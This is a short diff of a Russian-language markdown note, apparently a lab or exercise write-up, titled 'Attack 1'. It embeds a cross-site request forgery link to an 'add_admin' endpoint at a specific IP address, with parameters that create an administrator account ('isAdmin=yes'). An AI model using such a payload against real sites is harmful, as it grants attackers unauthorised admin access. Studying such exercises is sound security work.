@@ -1,5 +1,5 @@
 ## Атака 1
-Аккаунт нового пользователя создается с таким паролем <a href="http://92.124.140.111:1337/add_admin?username=admin&password=789456&isAdmin=yes&submit=Add+User">test</a>  a href="http://92.124.140.111:1337/add_admin?username=admin&password=789456&isAdmin=yes&submit=Add+User" 
+Аккаунт нового пользователя создается с таким паролем <a href="http://92.124.140.111:1337/add_admin?username=admin&password=789456&isAdmin=yes&submit=Add+User">test</a>     (a href="http://92.124.140.111:1337/add_admin?username=admin&password=789456&isAdmin=yes&submit=Add+User" )
 
 ## Атака 2
 
